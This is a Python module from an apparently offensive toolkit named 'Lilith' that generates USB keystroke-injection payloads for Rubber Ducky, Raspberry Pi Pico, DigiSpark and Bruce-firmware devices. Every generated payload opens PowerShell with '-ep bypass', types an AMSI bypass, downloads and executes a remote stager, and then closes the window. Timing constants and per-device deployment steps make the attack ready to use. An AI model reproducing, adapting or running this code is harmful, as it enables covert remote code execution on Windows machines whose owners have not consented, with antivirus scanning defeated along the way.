"""
Lilith — USB HID keystroke injection payload generator

Plug in → Win+R → PowerShell → AMSI bypass → SslStream fetch → stager executes.
PS window closes itself.  Whole sequence takes ~5-12 seconds depending on target speed.

Supported devices:
  duck      — Rubber Ducky v1/v2 (DuckyScript 1.0 — payload.txt on SD card)
  pico      — Raspberry Pi Pico / Zero (CircuitPython + adafruit_hid — code.py)
  digispark — DigiSpark ATtiny85 (Arduino DigiKeyboard — .ino via Arduino IDE)
  all       — All three

Keyboard layout: US only.  Non-US targets will mistype special chars ($, @, etc.).
"""

import os

from .stager import _compact_exec_loader

# ── timing constants (ms) — tune per target environment ──────────────────────
_BOOT_MS     = 2000   # USB enumeration + Windows HID driver load
_DIALOG_MS   = 700    # Win+R dialog open animation
_PS_READY_MS = 1800   # PowerShell cold-start
_LINE_MS     = 350    # pause between lines
_EXIT_MS     = 2500   # wait for stager to launch background process before closing

# DigiSpark types via software USB (~100 chars/sec).  Chunk line 2 (~1000 chars)
# into blocks with micro-pauses to prevent USB buffer stalls on slow hosts.
_DIGI_CHUNK  = 200
_DIGI_GAP_MS = 60


# ── string escaping ───────────────────────────────────────────────────────────

def _esc_c(s: str) -> str:
    """Escape for a C double-quoted string literal (DigiSpark .ino)."""
    return s.replace("\\", "\\\\").replace('"', '\\"')


def _esc_py(s: str) -> str:
    """Escape for a Python single-quoted string literal (Pico code.py)."""
    return s.replace("\\", "\\\\").replace("'", "\\'")


# ── payload generators ────────────────────────────────────────────────────────

def _duck(line1: str, line2: str, boot_ms: int) -> str:
    """DuckyScript 1.0 — works on Rubber Ducky v1, v2, and most clones."""
    return "\n".join([
        f"DELAY {boot_ms}",
        "GUI r",
        f"DELAY {_DIALOG_MS}",
        "STRING powershell -ep bypass",
        "ENTER",
        f"DELAY {_PS_READY_MS}",
        f"STRING {line1}",
        "ENTER",
        f"DELAY {_LINE_MS}",
        f"STRING {line2}",
        "ENTER",
        f"DELAY {_EXIT_MS}",
        "STRING exit",
        "ENTER",
    ])


def _teembed(line1: str, line2: str, boot_ms: int) -> str:
    """DuckyScript 1.0 for Bruce firmware BadUSB (T-Embed Plus / M5StickC / compatible).

    Deploy: copy to /BadUSB/lilith_badusb.txt on the SD card
    Run   : Bruce menu → BadUSB → lilith_badusb.txt → Run
    """
    return "\n".join([
        "REM Lilith BadUSB — Bruce firmware (T-Embed Plus)",
        "REM Deploy: /BadUSB/lilith_badusb.txt on SD card",
        "REM Run: Bruce → BadUSB → lilith_badusb.txt",
        f"DELAY {boot_ms}",
        "GUI r",
        f"DELAY {_DIALOG_MS}",
        "STRING powershell -ep bypass",
        "ENTER",
        f"DELAY {_PS_READY_MS}",
        f"STRING {line1}",
        "ENTER",
        f"DELAY {_LINE_MS}",
        f"STRING {line2}",
        "ENTER",
        f"DELAY {_EXIT_MS}",
        "STRING exit",
        "ENTER",
    ])


def _pico(line1: str, line2: str, boot_ms: int) -> str:
    """CircuitPython code.py for Raspberry Pi Pico / Pico W / Pico Zero.

    Requirements (copy to /lib on the device):
      https://circuitpython.org/libraries → adafruit-circuitpython-hid
    Flash CircuitPython firmware first:
      https://circuitpython.org/board/raspberry_pi_pico
    """
    l1 = _esc_py(line1)
    l2 = _esc_py(line2)
    return (
        "# Lilith USB HID — Raspberry Pi Pico (CircuitPython)\n"
        "# Requires: adafruit_hid in /lib  (adafruit-circuitpython-hid bundle)\n\n"
        "import time\n"
        "import usb_hid\n"
        "from adafruit_hid.keyboard import Keyboard\n"
        "from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS\n"
        "from adafruit_hid.keycode import Keycode\n\n"
        "kbd    = Keyboard(usb_hid.devices)\n"
        "layout = KeyboardLayoutUS(kbd)\n\n"
        f"time.sleep({boot_ms / 1000:.1f})\n\n"
        "kbd.send(Keycode.GUI, Keycode.R)\n"
        f"time.sleep({_DIALOG_MS / 1000:.2f})\n"
        "layout.write('powershell -ep bypass\\n')\n"
        f"time.sleep({_PS_READY_MS / 1000:.2f})\n\n"
        f"layout.write('{l1}\\n')\n"
        f"time.sleep({_LINE_MS / 1000:.2f})\n\n"
        f"layout.write('{l2}\\n')\n"
        f"time.sleep({_EXIT_MS / 1000:.2f})\n\n"
        "layout.write('exit\\n')\n"
    )


def _digispark(line1: str, line2: str, boot_ms: int) -> str:
    """Arduino .ino for DigiSpark ATtiny85.

    Board  : Digispark (Default - 16.5 MHz)
    Library: DigisparkKeyboard (Sketch → Include Library → Manage Libraries)
             or https://github.com/digistump/DigistumpArduino

    Line 2 is chunked into {chunk}-char blocks with {gap}ms pauses to prevent
    USB buffer stalls — DigiSpark's software USB is slow (~100 chars/sec).
    """.format(chunk=_DIGI_CHUNK, gap=_DIGI_GAP_MS)

    l1 = _esc_c(line1)
    l2 = _esc_c(line2)

    chunks = [l2[i:i + _DIGI_CHUNK] for i in range(0, len(l2), _DIGI_CHUNK)]
    chunk_code = "\n".join(
        f'  DigiKeyboard.print("{c}");\n  DigiKeyboard.delay({_DIGI_GAP_MS});'
        for c in chunks
    )

    return (
        "// Lilith USB HID — DigiSpark ATtiny85\n"
        "// Board: Digispark (Default - 16.5 MHz)\n"
        "// Library: DigisparkKeyboard\n\n"
        "#include \"DigiKeyboard.h\"\n\n"
        "void setup() {\n"
        f"  DigiKeyboard.delay({boot_ms});\n\n"
        "  // Win+R → Run dialog\n"
        "  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);\n"
        f"  DigiKeyboard.delay({_DIALOG_MS});\n"
        "  DigiKeyboard.print(\"powershell -ep bypass\");\n"
        "  DigiKeyboard.sendKeyStroke(KEY_ENTER);\n"
        f"  DigiKeyboard.delay({_PS_READY_MS});\n\n"
        "  // Line 1: AMSI bypass\n"
        f'  DigiKeyboard.print("{l1}");\n'
        "  DigiKeyboard.sendKeyStroke(KEY_ENTER);\n"
        f"  DigiKeyboard.delay({_LINE_MS});\n\n"
        "  // Line 2: download + exec (chunked for USB stability)\n"
        f"{chunk_code}\n"
        "  DigiKeyboard.sendKeyStroke(KEY_ENTER);\n"
        f"  DigiKeyboard.delay({_EXIT_MS});\n\n"
        "  // Close PS window\n"
        "  DigiKeyboard.print(\"exit\");\n"
        "  DigiKeyboard.sendKeyStroke(KEY_ENTER);\n"
        "}\n\n"
        "void loop() {}\n"
    )


# ── public API ────────────────────────────────────────────────────────────────

DEVICES = ("duck", "pico", "digispark", "teembed")

_FILENAMES = {
    "duck":      ("payload.txt",            "copy to /payload.txt on Rubber Ducky SD card"),
    "pico":      ("code.py",                "copy to / on CircuitPython drive (overwrite code.py)"),
    "digispark": ("payload_digispark.ino",  "open in Arduino IDE → board: Digispark 16.5MHz → upload"),
    "teembed":   ("lilith_badusb.txt",      "copy to /BadUSB/lilith_badusb.txt on SD card → Bruce → BadUSB → run"),
}

_GENERATORS = {
    "duck":      _duck,
    "pico":      _pico,
    "digispark": _digispark,
    "teembed":   _teembed,
}


def build_usb_payload(
    stager_url:   str,
    output_dir:   str,
    device:       str = "all",
    boot_delay_ms: int = _BOOT_MS,
) -> bool:
    """Generate HID keystroke payloads that fetch and execute a Lilith stager.

    stager_url    : full HTTPS URL to the stager .ps1 served by 'lilith serve'
    output_dir    : directory to write the payload file(s) into
    device        : 'duck' | 'pico' | 'digispark' | 'teembed' | 'all'
    boot_delay_ms : USB enumeration + HID driver wait (increase for slow targets)
    """
    os.makedirs(output_dir, exist_ok=True)

    lines = _compact_exec_loader(stager_url)
    # Split into two HID keystrokes:
    #   line1 = invisible-Unicode setup + bypass (everything up to and including the
    #           key/decoder/AMSI line, identified by the decoder scriptblock pattern)
    #   line2 = URL decode + TCP/SSL fetch + ScriptBlock exec
    split = next((i for i, l in enumerate(lines) if "param($b)" in l), None)
    if split is None:
        print("[!] _compact_exec_loader: could not locate decoder line")
        return False
    line1 = ";".join(lines[:split + 1])
    line2 = ";".join(lines[split + 1:])

    targets = DEVICES if device == "all" else (device,)
    ok = False

    for dev in targets:
        if dev not in _GENERATORS:
            valid = " | ".join(DEVICES)
            print(f"[!] Unknown device '{dev}'  (valid: {valid} | all)")
            continue

        content  = _GENERATORS[dev](line1, line2, boot_delay_ms)
        filename, note = _FILENAMES[dev]
        path = os.path.join(output_dir, filename)

        with open(path, "w") as f:
            f.write(content)

        print(f"[+] {dev:<12} → {path}")
        print(f"    Deploy : {note}")
        ok = True

    if ok:
        line2_chars = len(line2)
        digi_est    = round(line2_chars / 100)
        print(f"\n[*] Execution time estimate")
        base_s = (_BOOT_MS + _DIALOG_MS + _PS_READY_MS + _EXIT_MS) // 1000 + 2
        print(f"    Duck / Pico / T-Embed : ~{base_s}s total")
        print(f"    DigiSpark             : ~{base_s + digi_est}s total  (line 2 = {line2_chars} chars @ ~100 c/s)")
        print(f"    Boot delay  : {boot_delay_ms}ms  (use --usb-boot-delay to tune)")
        print(f"    Layout      : US  — non-US targets will mistype special chars")

    return ok
